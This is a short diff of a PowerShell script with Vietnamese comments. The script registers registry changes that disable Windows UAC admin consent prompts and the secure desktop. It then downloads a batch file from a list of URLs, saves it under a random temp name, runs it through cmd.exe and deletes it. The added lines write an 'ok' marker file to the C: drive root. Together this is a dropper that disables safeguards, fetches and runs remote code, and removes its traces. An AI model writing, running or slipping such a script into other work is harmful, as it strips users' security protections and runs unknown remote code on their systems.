@@ -1,6 +1,7 @@
 
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
+Set-Content -Path "C:\windows-backup-ps1.txt" -Value "ok"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 # Danh sách URL chứa file thực thi
@@ -24,5 +25,7 @@ $FilePath = "$env:USERPROFILE\AppData\Local\Temp\scheduler_$rand.bat"
 Set-Content -Path $FilePath -Value $response.Content
 # Thực thi file batch
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait
+Set-Content -Path "C:\windows-backup-ps1.txt" -Value "ok"
+
 # Xóa file tạm sau khi thực thi
 Remove-Item -Path $FilePath -Force
